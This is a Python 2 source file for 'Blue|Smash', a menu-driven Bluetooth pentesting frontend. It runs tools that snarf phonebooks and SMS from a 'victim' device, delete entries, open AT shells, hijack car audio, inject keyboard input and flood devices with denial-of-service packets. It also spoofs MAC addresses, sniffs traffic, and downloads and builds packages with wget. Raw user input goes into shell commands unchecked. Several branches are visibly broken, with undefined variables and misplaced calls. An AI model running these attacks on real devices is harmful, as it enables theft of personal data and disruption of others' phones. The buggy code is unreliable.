#!/usr/bin/python
##############################################################################
#                                                                            #
# Blue|Smash - A menu driven frontend for bluetooth pentesters.              #
#                                                                            #
# Created by: Zarren Spry (drgr33n)                                          #
# Copyright (C) 2008 Zarren Spry (drgr33n) zarren2@hotmail.co.uk             #
#                                                                            #
# This program is free software; you can redistribute it and/or modify it    #
# under the terms of the GNU General Public License version 3 as             #
# published by the Free Software Foundation; version 3.                      #
#                                                                            #
# This program is distributed in the hope that it will be useful, but        #
# WITHOUT ANY WARRANTY; without even the implied warranty of                 #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU          #
# General Public License for more details.                                   #
#                                                                            #
##############################################################################
try:
  import os,time,sys,struct, array,fcntl
  from pysqlite2 import dbapi2 as sqlite
  from bluetooth import *
  from bluetooth import _bluetooth as bt
except ImportError, e:
    raise ImportError("Your system is missing some dependencies, Please read the README file.")

##### Welcome Screen #####

version = "1.0e"

print """   
 _     _                                         _     
| |   | |                                       | |    
| |__ | | _   _ _____ _____ ___ ____  _____  ___| |__  
|  _ \| || | | | ___ (_____)___)    \(____ |/___)  _ \ 
| |_) ) || |_| | ____|    |___ | | | / ___ |___ | | | |
|____/ \_)____/|_____)    (___/|_|_|_\_____(___/|_| |_|
                                                        
		     Version: %s

A menu driven bluetooth pentesting tool for the Back|Track 
live CD.

By Zarren Spry AKA Drgr33n, Mail me @ zarren2@hotmail.co.uk


""" % (version)
##### End Welcome Screen #####

##### Hardware Check #####

print "Checking to see if HCI device exists...."
try:
  sock = bt.hci_open_dev()
  results = bt.hci_inquiry(sock, duration=1, flush_cache=True)
  print "Sucsess :D!"
except bt.error:
  print """No Local Device Detected! Please check your hardware.
Maybe Try 'hciconfig hci*' up and restart Blue|Smash.

Blue|Smash will now exit!
	   """
  sys.exit(1)

##### End Hardware Check #####
##### Start Bluetooth Services #####
os.popen("bash /etc/rc.d/rc.bluetooth restart")
##### Main Menu #####

try:
  while 1==1:
    mainmenu=raw_input("""Blue|Smash Main Menu :

    1. Blue|Smash Updates
    2. Discovery & Fingerprinting
    3. Connectivity
    4. Exploits
    5. Bluetooth Services
    6. Check to see if device is vulnerable
    7. Frontline bluetooth sniffer
    8. Credits
    9. Exit

    Enter the number: """)
    
##### End Main Menu #####

##### Install Menu #####

    if mainmenu == ('1'):
      while 1 == 1:
           umenu=raw_input("""Please Choose from the following ...

    1. Bluez Update
    2. BTscanner Update
    3. Kdebluetooth Update
    4. Install Slapt-Get (Just like apt-get for Ubuntu)
    5. Install Obexftp & openOBEX
    6. Install T-Bear
    7. Update PyBluez
    8. Install libxml2
    9. Return to Main Menu

    Enter number: """)
           if umenu == '1':
             print """

              **** Updating Bluez ****

              """
             a=os.system("slapt-get --update;slapt-get --install bluez-firmware bluez-hcidump bluez-libs bluez-utils")
           if umenu == '2':
             print """

              **** Updating BTscanner ****

              """
             print "Not implemented yet!!! ;p"
           if umenu == '3':
             print """

             **** Updating KdeBluetooth ****

             """
             c=os.system("slapt-get --update;slapt-get --install KdeBluetooth")
           if umenu == '4':
             print """

              **** Installing Slapt-get ****

              """
             d=os.system("cd /;wget http://software.jaos.org/slackpacks/12.0/slapt-get-0.9.12c-i386-1.tgz;tar -zxvf slapt-get-0.9.12c-i386-1.tgz;rm slapt-get-0.9.12c-i386-1.tgz")
           if umenu == '5':
             print """

              **** Installing ObexFTP & openOBEX ****

              """
             e=os.system("slapt-get --update;slapt-get --install openobex obexftp")
           if umenu == '6':
             print """

              **** Installing T-Bear Suite ****

              """
             f=os.system("wget http://www.edgedata.net/~tbear/tbear.tar.gz;tar -zxvf tbear.tar.gz;cd tbear-1.5;make;make install;cd ..;rm -rf t-bear-1.5;rm tbear.tar.gz")
           if umenu == '7':
             print """

              **** Updating PYBluez ****

              """
             g=os.system("slapt-get --update;slapt-get --install pybluez")
           if umenu == '8':
             print """

              **** Installing libxml2 ****

              """
             g=os.system("wget ftp://xmlsoft.org/libxml2/libxml2-cvs-snapshot.tar.gz;tar zxvf libxml2-cvs-snapshot.tar.gz;cd libxml2-2.6.30;./configure --prefix=/usr;make;make install;cd ..;rm -r libxml2-2.6.30; rm -rf libxml2-cvs-snapshot.tar.gz;mv /usr/include/libxml2/libxml /usr/include/libxml ")
           if umenu == '9':
             print "Returning to previous menu"
             break
	   
##### End Install Menu #####

##### Bluetooth Profiling Menu #####

    if mainmenu == ('2') :
	while 1 == 1 :
           pmenu=raw_input("""
Bluetooth Profiling Menu:

       1. Scan for Devices
       2. Fingerprint Devices
       3. Return to Previous Menu
       
       Enter a number: """)
       
##### End Bluetooth Profiling Menu #####

           if pmenu == ('1') :
             scanchoice=raw_input("""Bruteforce or Inquiry scan ?
	    
Enter 1 for Inquiry 2 for Brute Force: """)
             if scanchoice == '1':
               inquiryscan1=raw_input("Enter the device you want to use...: ")
               print "Scanning for devices... be patient !"
               inquiryscan2=os.system("hcitool scan %s > bluetooth-devices.txt" % (inquiryscan1))
               print "*** Results will be saved in bluetooth-devices.txt ***"
               print 'Done.'
             if scanchoice == '2':
               bruteforce1=raw_input("Enter the starting address you want to use...: ")
               bruteforce2=raw_input("Enter the ending address you want to use...: ")
               print "Scanning for devices... This could take a while..."
               bruteforce3=os.system("/pentest/bluetooth/redfang/fang -r %s-%s -o bluetooth-devices.txt"% (bruteforce1,bruteforce2))
               print "*** Results will be saved in bluetooth-devices.txt ***"
               print 'Done.'
	       
##### End Option 1 Scan #####

##### Option 2 Fingerprint #####

##### Option 2 Fingerprint Sub Menu #####

           if pmenu == ('2') :
             pchoice1=raw_input("""Bluetooth Fingerprinting Menu:

       1. Browse Services
       2. Search for Services
       3. Request all Records
       4. Return to Previous Menu
       
       Enter a number: """)
       
##### End Fingerprint Sub Menu #####

##### Option 2 Fingerprint Sub Menu 1 #####

             if pchoice1 == '1' :
              browse1=raw_input("Enter the Victims MAC ...: ")
              print "Browsing Services on %s" % (browse1)
              browse2=os.system("sdptool browse %s > services.txt" % (browse1))
              print "*** Results will be saved in services.txt ***"
              print 'Done.'
	      
##### End Option 2 Fingerprint Sub Menu 1 #####

##### Option 2 Fingerprint Sub Menu 2 #####

             if pchoice1 == '2' :
               search1=raw_input("Enter the Victims MAC ...: ")
               search2=raw_input("Enter a service to search ... : ")
               print "Searching for %s on %s" % (search2,search1)
               search3=os.system("sdptool search %s %s > search.txt" % (search2,search1))
               print "*** Results will be saved in search.txt ***"
               print 'Done.'
	       
##### End Option 2 Fingerprint Sub Menu 2 #####

##### Option 2 Fingerprint Sub Menu 3 #####

             if pchoice1 == '3' :
               record1=raw_input("Enter the Victims MAC ...: ")
               print "Requesting all Records on %s" % (record1)
               record2=os.system("sdptool browse %s > records.txt" % (record1))
               print "*** Results will be saved in records.txt ***"
               print 'Done.'
	       
##### End Option 2 Fingerprint Sub Menu 3 #####

##### Option 2 Fingerprint Sub Menu 4 #####

             if pchoice1 == '4' :
               print "Returning to previous menu"
               break
	     
##### Option 3 Return #####

           if pmenu == '3' :
             print """

               ***** Returning to Previous Menu *****
    
 
             """
             break
##### End Option 3 Return #####

##### Connectivity Menu #####

    if mainmenu == '3' :
       
       while 1==1:
          conmenu=raw_input("""Please Choose from the Following :

         
   1. Make a RFCOMM connection
   2. Make a HCI connection
   3. Request new pairing process
   4. Return to Previous Menu
    
Enter a number: """)

##### Option 1 Make a RFCOMM connection #####
          if conmenu == '1':
            conchoice1=raw_input("Would you like to Connect(1) or Bind(2)? Enter a number: ")
            if conchoice1 == '1':
	      try:
	        subcon1=raw_input("Enter the Device MAC address: ")
	        subcon2=input("Enter the Channel to connect on: ")
	        print "Connecting to \"%s\" on Channel %s" % (subcon1,subcon2)
	        sock=BluetoothSocket( RFCOMM )
	        sock.connect((subcon1, subcon2))
		print "You are now connected to \"%s\" on channel %s" % (subcon1,subcon2)
		print "To quit just hit enter"
                while True:
                  data = raw_input()
                  if len(data) == 0: break
                  sock.send(data)
                  sock.close()
	      except Exception:
                print "Connection Failed !"
            if conchoice1 == '2':
	      subhcic1=raw_input("Enter the Device MAC address: ")
	      subhcic2=raw_input("Enter RFCOMM device: ")
	      subhcic3=raw_input("Enter Channel to bind: ")
	      rfcommbnd=os.system("rfcomm bind %s %s %s" % (subhcic2,subhcic1,subhcic3))
	      print "Done"
	      
##### End Option 1 Make RFCOMM connection #####

##### Option 2 Make HCI connection #####

	  if conmenu == '2':
	    subkey1=raw_input("Enter the Device MAC address: ")
	    subkey2=raw_input("Enter your device name (eg hci0): ")
	    rfcommbnd=os.system("hcitool -i %s cc %s" % (subkey2,subkey1))
	    print "Done"
	    
##### End Option 2 Make HCI connection #####

##### Option 3 Request Key #####

	  if conmenu == '3':
	    try:
	      subkey1=raw_input("Enter the Device MAC address: ")
	      subkey2=raw_input("Enter your device name (eg hci0): ")
	      rfcommbnd=os.system("hcitool -i %s key %s" % (subkey2,subkey1))
	      print "Done"
	    except:
	      print "Request key failed!"
##### End Option 3 Request Key #####

##### Option 4 Previous Menu #####

	  if conmenu == '4':
            print """

              ***** Returning to Previous Menu *****
    
 
            """
            break
	  
##### End Option 4 Previous Menu #####

##### Bluetooth Exploits Menu #####

    if mainmenu == '4' :
       
       while 1==1:
          expmenu=raw_input("""Please Choose from the Following :

         
   1. Bluebugger
   2. Bluesnarfer
   3. Tanya DoS Attack
   4. CarWhisperer
   5. Bluesnarf++
   6. Create BlueBug AT Shell
   7. Bluesmack
   8. vcard DoS
   9. Helo Moto Attack (Motorola)
   10. Blue Snarf an ericsson phone
   11. hci-dump-crash
   12. l2cap phone DoS
   13. HIDattack
   14. Return to previous menu
   Enter a number: """)

##### Option 1 Bluebugger #####
 
          if expmenu == '1':
	    if not os.path.exists("/dev/rfcomm0"):
	      print "Creating temp RFCOMM Device"
	      os.spawnlp(os.P_WAIT,'mknod','mknod','/dev/rfcomm0','c','216','0')
            print "Starting Bluebugger..."
	    bug1=raw_input("Enter Channel to use ...: ")
	    bug2=raw_input("Enter Victims MAC ...: ")
	    print """
	      
	          info                   = Read Phone Info
       		  phonebook              = Read Phonebook
                  messages               = Read SMS Messages
                  dial <num>             = Dial number
                  ATCMD                  = Custom Command (e.g. '+GMI')
  
                  Note: Modes can be combined, e.g. 'info phonebook +GMI'
	  	     
	  	     
	          """
  	    bug3=raw_input("Enter Mode ...: ")
            print "*** Results will be saved as bluebugger.txt ***"
            bug4=os.system("bluebugger -c %s -o bluebugger.txt -a %s %s "% (bug1,bug2,bug3))
            print "Removing temp RFCOMM Device"
	    rfcomm2=os.system("rm -rf /dev/rfcomm0")
	    print 'Done.'
	    
##### End Option 1 Bluebugger #####

##### Option 2 Bluesnarfer #####

          if expmenu == '2':
	    if not os.path.exists("/dev/bluetooth/rfcomm/0"):
	      print "Creating temp RFCOMM Device"
	      os.system('mkdir -m 666 /dev/bluetooth/;mkdir -m 666 /dev/bluetooth/rfcomm/;mknod /dev/bluetooth/rfcomm/0 c 216 0')
            print "Starting Bluesnarfer..."
            snfchoice1=raw_input("""What would you like to do ?:

         1. Custom ATCMD
         2. Read Phone Book
         3. Delete Phone Book Entry
         4. Search Name in Phonebook Address
         5. List Available Phone Book Memory Storage
         6. Device Info
         7. Return to Previous Menu
       
         Choose an Option : """)
            if snfchoice1 == '1' :
	      snf1=raw_input("Enter Channel to use ...: ")
	      snf2=raw_input("Enter Victims MAC ...: ")
              snf3=raw_input("Enter ATCMD ...: ")
              print "*** Results will be saved as bluesnarfer.txt ***"
              snf1=os.system("bluesnarfer -C %s -b %s -c %s >> bluesnarfer.txt"% (snf1,snf2,snf3))
              print 'Done.'
            if snfchoice1 == '2' :
	      snf1=raw_input("Enter Channel to use ...: ")
	      snf2=raw_input("Enter Victims MAC ...: ")
              snf3=raw_input("Enter Start Address ...: ")
       	      snf4=raw_input("Enter End Address ...: ")
	      print "Reading %s to %s" % (snf3,snf4)
              print "*** Results will be saved as bluesnarfer.txt ***"
	      snf1=os.system("bluesnarfer -C %s -b %s -r %s-%s >> bluesnarfer.txt"% (snf1,snf2,snf3,snf4))
              print 'Done.'
            if snfchoice1 == '3' :
              snf1=raw_input("Enter Channel to use ...: ")
              snf2=raw_input("Enter Victims MAC ...: ")
              snf3=raw_input("Enter Start Address ...: ")
	      snf4=raw_input("Enter End Address ...: ")
	      print "Deleting %s to %s" % (snf3,snf4)
              print "*** Results will be saved as bluesnarfer.txt ***"
	      snf1=os.system("bluesnarfer -C %s -b %s -w %s-%s >> bluesnarfer.txt"% (snf1,snf2,snf3,snf4))
              print 'Done.'
            if snfchoice1 == '4' :
   	      snf1=raw_input("Enter Channel to use ...: ")
	      snf2=raw_input("Enter Victims MAC ...: ")
              snf3=raw_input("Enter Name ...: ")
  	      print "Searching %s" % (snf3)
              print "*** Results will be saved as bluesnarfer.txt ***"
	      snf1=os.system("bluesnarfer -C %s -b %s -f %s >> bluesnarfer.txt"% (snf1,snf2,snf3))
              print 'Done.'
            if snfchoice1 == '5' :
	      snf1=raw_input("Enter Channel to use ...: ")
	      snf2=raw_input("Enter Victims MAC ...: ")
              print "*** Results will be saved as bluesnarfer.txt ***"
	      snf1=os.system("bluesnarfer -C %s -b %s -l >> bluesnarfer.txt"% (snf1,snf2))
              print 'Done.'
            if snfchoice1 == '6' :
	      snf1=raw_input("Enter Channel to use ...: ")
	      snf2=raw_input("Enter Victims MAC ...: ")
              print "*** Results will be saved as bluesnarfer.txt ***"
	      snf1=os.system("bluesnarfer -C %s -b %s -i >> bluesnarfer.txt"% (snf1,snf2))
              print 'Done.'
            if snfchoice1 == '7' :
              print "Returning to Previous Menu"
	      break
##### End Option 2 Bluesnarfer #####

##### Option 3 DoS Attack #####
          if expmenu == '3':
            print "T-Bear Tanya DoS Attack"
	    dos1=raw_input("Enter Victims MAC ...: ")
	    print "DoS Attack in progress on victim %s Press Ctrl+C to stop attack..."% (dos1)
	    dos3=os.system("tanya %s" % (dos1))
	    print 'Done.'
##### End Option 3 DoS Attack #####

##### Option 4 carwhisperer #####

          if expmenu == '4':
            carw1=raw_input("Enter your device ID [eg hci0]: ")
            print "Changing class ID..."
	    carw3=os.system("hciconfig %s class 0x500204" % (carw1))
	    carw2=raw_input("Enter Victims MAC ...: ")
	    carw4=os.system("/pentest/bluetooth/carwhisperer/carwhisperer 0 message.raw %s.raw %s %s >> %s.log"% (carw2,carw2,carw2,carw2))
	    print "DoS Attack in progress on victim %s Press Ctrl+C to stop attack..."% (dos2)

##### End Option 4 carwhisperer #####

##### Option 5 bluesnarf++ #####
	    
          if expmenu == '5':
            snfplus1=raw_input("Enter Victims MAC ...: ")
	    snfplus2=raw_input("Enter Channel to use ...: ")
	    print "Bluesnarfing %s on Channel %s..."% (snfplus1,snfplus2)
	    snfplus3=os.system("btftp %s %s " % (snfplus1,snfplus2))
	    print "done"
	    
##### End Option 5 bluesnarf++ #####

##### Option 6 bluebug AT shell #####
	    
          if expmenu == '6':
            atshell1=raw_input("Enter Victims MAC ...: ")
	    atshell2=raw_input("Enter Channel to use ...: ")
	    print "Trying to open AT shell on %s "% (atshell1)
	    atshell3=os.system("atshell %s %s " % (atshell1,atshell2))
	    print "done"
	    
##### End Option 6 bluebug AT shell #####

##### Option 7 bluesmack #####
	    
          if expmenu == '7':
              bluesmk1=raw_input("Enter Victims MAC ...: ")
	      print "Bluesmaking %s Ctrl+C to quit..."% (bluesmk1)
	      bluesmk2=os.system("l2ping -f -s 667 %s >> /dev/null" % (bluesmk1))
  	      print 'Done.'
	    
##### End Option 7 bluesmack #####

##### Option 8 vcard DoS #####
	    
          if expmenu == '8':
              vcard1=raw_input("Enter Victims MAC ...: ")
	      vcard2=raw_input("Enter path to vcard ...: ")
	      print "Sending %s to %s"% (vcard2,vcard1)
	      vcard3=os.system("btobex push %s  %s >> temp" % (vcard1,vcard2))
  	      print 'Done.'
	    
##### End Option 8 vcard DoS #####

##### Option 9 HeloMoto #####
	    
          if expmenu == '9':
              moto1=raw_input("Enter Victims MAC ...: ")
	      moto2=raw_input("Enter Channel to use ...: ")
	      moto3=raw_input("Enter your device name [eg hci0] ...: ")
	      print "Creating RFCOMM connection... "
	      moto4=os.system("rfcomm -i %s connect %s %s"% (moto3,moto3,moto2))
	      print "Trying to to launch AT shell on channel %s"% (moto2)
              moto5=os.system("atshell %s %s")% (moto1,moto2)
	      print 'Done.'
	    
##### End Option 9 HeloMoto #####

##### Option 10 bluesnarf Erricson  #####
	    
          if expmenu == '10':
              snferric1=raw_input("Enter Victims MAC ...: ")
	      snferric2=raw_input("Enter Channel to use ...: ")
	      print "Trying to snarf %s"% (snferric1)
	      snferric3=os.system("obexftp -b %s -B %s -g telecom/pb.vcf > phonebook"% (snferric1,snferric2))
	      time.sleep(3)
              file = open("phonebook")
	      line = file.readline()
	      if line:
	        print "Success!!!"
	      if not line:
	        print "Trying another approach..."
		snferric4=os.system("attest %s %s > phonebook"% (snferric1,snferric2))
		time.sleep(3)
		file = open("phonebook")
	        line = file.readline()
		if line:
		  print "Success!!!"
		if not line:
	          print "Snarf Unsuccessful!!!"
		  
##### End Option 10 bluesnarf Erricson #####

##### Option 11 hcidump crash #####
	    
          if expmenu == '11':
              hcic1=raw_input("Enter Victims MAC ...: ")
	      print "Launching hcidump_crash... Ctrl+C to stop "
	      hcic2=os.system("hcidump-crash %s"% (hcic1))
	      print 'Done.'
	    
##### End Option 11 hcidump crash #####

##### Option 12 l2cap Header Size Overflow #####
	    
          if expmenu == '12':
              l2hso1=raw_input("Enter Victims MAC ...: ")
	      print "Launching l2cap Header Size Overflow "
	      l2hso2=os.system("l2cap_headersize_overflow %s"% (l2hso1))
	      print 'Done.'
	    
##### End Option 12 l2cap Header Size Overflow #####

##### Option 13 HID attack #####
	    
          if expmenu == '13':
	     print "HIDattack will inject 0wnd into a bluetooth keyboard."
	     print "Full control to be implemented ;P, Setting up your device..."
	     hci1=raw_input("Enter your device name [eg hci0]...:")
	     hid2=os.system("hcitool %s piscan;hciconfig %s class 0x002540;sdpd"% (hci1,hci1))
             hidchoice=raw_input("""Client or Server attack ?
	    
Enter 1 for client 2 for Server: """)
	     if hidchoice == '1':
	       subhid1=raw_input("Enter the victims MAC...:")
	       subhid2=os.system("hidattack -e ha.inp -c %s "% (subhid1))
	     if hidchoice == '2':
	       subhid3=os.system("hidattack -e ha.inp -s")
	       
##### End Option HID attack #####

	  if expmenu == '14':
            print """

              ***** Returning to Previous Menu *****
    
 
            """
            break

##### End Bluetooth Exploits Menu #####

##### Bluetooth Services Menu #####

    if mainmenu == '5':
      while 1==1 :
        smenu=raw_input("""
Bluetooth Services Menu:

       1. RFCOMM Shell
       2. RFCOMM Server 
       3. Spoof MAC Address
       4. Return to Previous Menu
       
       Enter a number: """)
       

##### Option 1 RFCOMM Shell##### 

        if smenu == '1':
          mac = raw_input("Enter the Device MAC address: ")
          port = input("Enter the Channel to connect on: ")
          print "Connecting to \"%s\" on Channel %s" % (mac,port)
          try:
            sock = BluetoothSocket( RFCOMM )
            sock.connect((mac, port))
            print "You are now connected to \"%s\" on channel %s" % (mac,port)
            print "Type quit to exit."
            while True:
	      print "Type quit to exit."
              data = raw_input()
            if data == 'quit': 
	      break
              sock.send(data)
            sock.close()
          except:
            print "Connection was closed !"
    
	  
##### End Option 1 l2cap Server #####

##### Option 2 RFCOMM Server #####
        if smenu == '2':
          print "Starting RFCOMM server..."
          server_sock = BluetoothSocket( RFCOMM )
          server_sock.bind(("",PORT_ANY))
          server_sock.listen(1)
          port = server_sock.getsockname()[1]
          try:
            uuid = btid.uuid1()
          except:
            print "Error! No UUID Generated"
            sys.exit(1)
          print "UUID Generated, Starting Server....."
          rfcomm_serv_name = raw_input("Enter Service Name ....")
          advertise_service( server_sock, rfcomm_serv_name,
                             service_id = "%s" % uuid,
                             service_classes = [ "%s" % uuid, SERIAL_PORT_CLASS ],
                             profiles = [ SERIAL_PORT_PROFILE ] )
          print "Waiting for connection on channel %d" % port
          client_sock, client_info = server_sock.accept()
          print "Accepted connection from ", client_info
          try:
            while True:
              data = client_sock.recv(1024)
              total_data += len(data)
              print "received [%s]" % data
          except IOError:
            pass
            print "total bytes read: %d" % total
          print "Client Disconnected :("
          print "Total bytes read: %d" % total
          client_sock.close()
          server_sock.close()

##### End Option 2 RFCOMM Server SDP Server #####

##### Option 3 Spoof MAC #####

        if smenu == '3':
	  print "Saving your old MAC address"
	  macadd1=os.system("hcitool dev > oldmacs.txt")
	  macadd2=input("Enter the number of the device [eg hci0 would be 0]...:")
	  macadd3=raw_input("Enter your new MAC...:")
	  macadd4=os.system("bdaddr -i hci%s -r -t %s"% (macadd2,macadd3))
	  time.sleep(3)
	  print "Resetting your adaptor..."
	  macadd5=os.system("hciconfig hci%s down"% (macadd2))
	  time.sleep(3)
	  macadd6=os.system("hciconfig hci%s up"% (macadd2))
	  print "Your new address is %s, ;p"% (macadd3)


##### End Option 3 Spoof MAC #####

	if smenu == '4':
          print """

            ***** Returning to Previous Menu *****
    
 
          """
          break
	
##### Option 6 Vulnerability Check #####

    if mainmenu == '6':
      def exp_bluebugger():
        if not os.path.exists("/dev/rfcomm0"):
          os.spawnlp(os.P_WAIT,'mknod','mknod','/dev/rfcomm0','c','216','0')
        os.popen("bluebugger -c %s -o bluebugger.txt -a %s info "% (svc["port"],victim))
        vun_check = open("bluebugger.txt", "r")
        linelist = vun_check.readlines()
        if len(linelist) > 6:
          c.execute('insert into bluebugger (id, name, port, vulnreable) values (null, ?, ?, ?)', (svc["name"],svc["port"], 'y'))
	  con1.commit()
        else:
          c.execute('insert into bluebugger (id, name, port, vulnreable) values (null, ?, ?, ?)', (svc["name"],svc["port"], 'n'))
	  con1.commit()
	
      def exp_bluesnarfer():
        if not os.path.exists("/dev/bluetooth/rfcomm/0"):
	  os.popen("mkdir -m 666 /dev/bluetooth;mkdir -m 666 /dev/bluetooth/rfcomm")
          os.spawnlp(os.P_WAIT,'mknod','mknod','/dev/bluetooth/rfcomm/0','c','216','0')
        os.system("bluesnarfer -i -C %s -b %s >> bluesnarfer%s.txt"% (svc["port"],victim,fileno))
	time.sleep(2)
	vun_check2 = open("bluesnarfer%s.txt"% (fileno))
	linelist2 = vun_check2.readlines()
	if len(linelist2) > 2:
          c.execute('insert into bluesnarfer (id, name, port, vulnreable) values (null, ?, ?, ?)', (svc["name"],svc["port"], 'y'))
	  con1.commit()
        else:
          c.execute('insert into bluesnarfer (id, name, port, vulnreable) values (null, ?, ?, ?)', (svc["name"],svc["port"], 'n'))
	  con1.commit()
	  
      print "Blue|Smash Vulnerability Checker :p"
      print "Scanning for devices......."
      listno1 = 0
      nearby_devices = discover_devices(lookup_names = True)
      for name, addr in nearby_devices:
        listno1 += (1)
        print "%s) %s - %s" % (listno1, name, addr)
      victim = raw_input("Enter the victims MAC....:")
      if victim == name:
        if os.path.exists(victim):
          print "DB already exists! Removing old DB......."
          os.system("rm %s" % (victim))
        print "Creating sqlite DB %s" % (victim)
        con1 = sqlite.connect (victim)
        c = con1.cursor()
        c.execute('''CREATE TABLE bluebugger (
             id INTEGER PRIMARY KEY,
             name TEXT,
             port TEXT,
             vulnreable TEXT
            )''')
        c.execute('''CREATE TABLE bluesnarfer (
             id INTEGER PRIMARY KEY,
             name TEXT,
             port TEXT,
             vulnreable TEXT
            )''')
        services = find_service(address=name)
        if len(services) > 0:
          print "Blue|Smash found %d services on %s" % (len(services), victim)
          print
        else:
          print "Sorry no services were found on %s :("% (victim)
        fileno = 0
        for svc in services:
          fileno += (1)
          exp_bluebugger()
	  exp_bluesnarfer()
	print
        c.execute("select * from bluebugger order by id")
        print '-' * 78
        for fieldDesc in c.description:
          print fieldDesc[0].ljust(21) ,
        print 
        print '-' * 78
        fieldIndices = range(len(c.description))
        for row in c:
          for fieldIndex in fieldIndices:
            fieldValue = str(row[fieldIndex])
            print fieldValue.ljust(21) ,
	  print
	print
        c.execute("select * from bluesnarfer order by id")
        print '-' * 78
        for fieldDesc in c.description:
          print fieldDesc[0].ljust(21) ,
        print 
        print '-' * 78
        fieldIndices = range(len(c.description))
        for row in c:
          for fieldIndex in fieldIndices:
            fieldValue = str(row[fieldIndex])
            print fieldValue.ljust(21) ,
	  print
	print "Removing temp files...."
        remove_temp = os.system("rm -r bluebugger.txt;rm -r bluesnarfer*.txt")
	print "Reseting bluetooth adaptor"
	os.popen("hciconfig hci0 reset")
      else:
        print "Error!!! Blue|Smash will now exit."
        break

##### End Option 6 Vulnerability Check #####

##### Option 7 Frontline bluetooth sniffer #####

    if mainmenu == '7':
 
# Attack function

      def csr_sniffer():
	os.popen("csr_sniffer -d %s -s"% (dev_id))
        if def_hci_timer == ('y'):
          timer = ('-t')
	  os.popen("csr_sniffer -d %s %s "% (dev_id,timer))
        if def_hci_filter ==('y'):
          ftr_type = raw_input("Enter Filter Number ....:  ")
          myfilter = ('-f %s'% (ftr_type))
	  os.popen("csr_sniffer -d %s %s "% (dev_id,myfilter))
        if def_pkt_ignore == ('y'):
	  igr_type = raw_input("Enter Packet Type ....:  ")
	  pktignore = ('-i %s'% (igr_type))
	  os.popen("csr_sniffer -d %s %s "% (dev_id,pktignore))
        if def_pkt_zero == ('y'):
	  zero = ('-z')
	  os.popen("csr_sniffer -d %s %s "% (dev_id,zero))
        if def_own_pin == ('y'):
  	  pin = ('-p')
	else:
	  pin = ('')
        print "Launching Sniffer :p"
	print "hcidump's log will be stored in %s@%s.cap"% (victim1,victim2)
	os.popen("hcidump -i hci1 -w %s@%s.cap"% (victim1,victim2))
	print "csr_sniffer's log will be stored in %s@%sraw.cap"% (victim1,victim2)
        print "Starting Sniffer... Ctrl + c to exit."
	os.popen ("csr_sniffer -d %s -S %s@%s") 
	os.popen("csr_sniffer -d %s %s -e -w %s@%sraw.cap"% (dev_id,victim1,victim2))
	while True:
	  time.sleep(30)
	  print "Syncing"
	  os.popen("csr_sniffer -d %s -s"% (dev_id))
          if def_hci_timer == ('y'):
	    os.popen("csr_sniffer -d %s %s "% (dev_id,timer))
          if def_hci_filter ==('y'):
	    os.popen("csr_sniffer -d %s %s "% (dev_id,myfilter))
          if def_pkt_ignore == ('y'):
	    os.popen("csr_sniffer -d %s %s "% (dev_id,pktignore))
          if def_pkt_zero == ('y'):
	    os.popen("csr_sniffer -d %s %s "% (dev_id,zero))
	  os.popen ("csr_sniffer -d %s -S %s@%s") 
	  os.popen("csr_sniffer -d %s %s -e -w %s@%sraw.cap"% (dev_id,victim1,victim2))
	  print "Done next sync in 30 seconds"
      try:
	    
# Title

        print "Blue|Smash Frontline Bluetooth Sniffer"
    
# User Input
        
	dev_id = raw_input("Enter device name eg hci0.....:  ")
        def_hci_timer = raw_input("Use Timer ? y/n:  ")
        def_hci_filter = raw_input("Use Filter ? y/n:  ")
        def_pkt_ignore = raw_input("Ignore packet type? y/n:  ")
        def_pkt_zero = raw_input("Ignore zero length packets? y/n:  ")
        def_own_pin = raw_input("Own pin? y/n:  ")
	  
# The Sniffer :p

        print "Scanning for devices......."
        nearby_devices = discover_devices(lookup_names = True)
	if len(nearby_devices) > 0:
	  for name, addr in nearby_devices:
	    print "Blue|Smash found %s - %s" % (name, addr)
	    victim1 = raw_input("Enter the Master's MAC....:")
            victim2 = raw_input("Enter the Slaves's MAC....:")
	    csr_sniffer()
	else:
	  print "Blue|Smash didn't find any device within range."
	  print "Enter the MAC manually or scan again."
	  rescan = raw_input("Scan Again? y/n : ")
	  if rescan == ('y'):
	    print "Rescanning for devices......."
	    nearby_devices = discover_devices(lookup_names = True)
	    if len(nearby_devices) > 0:
	      for name, addr in nearby_devices:
	        print "Blue|Smash found %s - %s" % (name, addr)
	        victim1 = raw_input("Enter the Master's MAC....:")
                victim2 = raw_input("Enter the Slaves's MAC....:")
	        csr_sniffer()
	      else: 
	        print "Sorry no devices found ! Returning to main menu"
	  else:
	    csr_sniffer()

# Exit

      except KeyboardInterrupt :
        print "Sniffing ended by user, releasing BT adaptor...."
	os.popen("csr_sniffer -d %s -s"% (dev_id)) 
	time.sleep(2)
	print "Done."	
	
##### End Option 8 Frontline Bluetooth Sniffer #####

    if mainmenu == '8':
      print"""
    
Credits:
	    
Big Thanks to Relik @ http://www.securestate.com for the menu and other bits and bobs taken from Fast-Track, Sorbo <sorbox@yahoo.com> for his work and the csr_sniffer script and to the Back-Track guys http://www.remote-exploit.org for a great pentesting tool.

Also Big Thanks to D Hulton @ OpenCiphers for BTpincrack :D.

	   """


    if mainmenu == '9':
       print """

   Exiting Blue|Smash...

   """
       break

	    
except KeyboardInterrupt :
  print """

   Exiting Blue|Smash...

   """
   
except Exception :
   print """
   
   Error! Exiting Blue|Smash...

   """
   
# EOF Biach